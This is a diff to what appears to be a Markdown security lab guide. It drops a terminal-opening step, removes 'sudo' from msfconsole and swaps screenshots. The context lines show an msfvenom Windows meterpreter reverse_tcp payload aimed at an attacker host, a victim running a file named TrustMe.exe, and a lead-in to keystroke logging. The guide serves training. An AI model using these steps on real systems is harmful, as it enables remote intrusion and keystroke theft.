@@ -275,17 +275,10 @@ msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=[You
 
 
 
-Let's start the **Metasploit** Handler. We need another **Linux Terminal**
-
-- **Double-click** `Ubuntu Shell` on Desktop
-
-<img width="90" height="104" alt="Screenshot From 2026-02-23 10-28-37" src="https://github.com/user-attachments/assets/196f7867-877b-4a37-bc02-1214e50e96a5" />
-
-
 Now let's start the **Metasploit** Handler
 
 ```bash
-sudo msfconsole -q
+msfconsole -q
 ```
 
 We are going to run the following commands to correctly set the parameters:
@@ -344,8 +337,7 @@ TrustMe.exe
 
 Back at your Ubuntu terminal, you should have a metasploit session!
 
-![](attachments/meterpretersession.png)
-
+<img width="987" height="392" alt="2026-03-26_10-44" src="https://github.com/user-attachments/assets/152dd3e7-11d7-43d8-85f6-45d0870cc725" />
 
 Now, let’s look at keystroke logging.
 
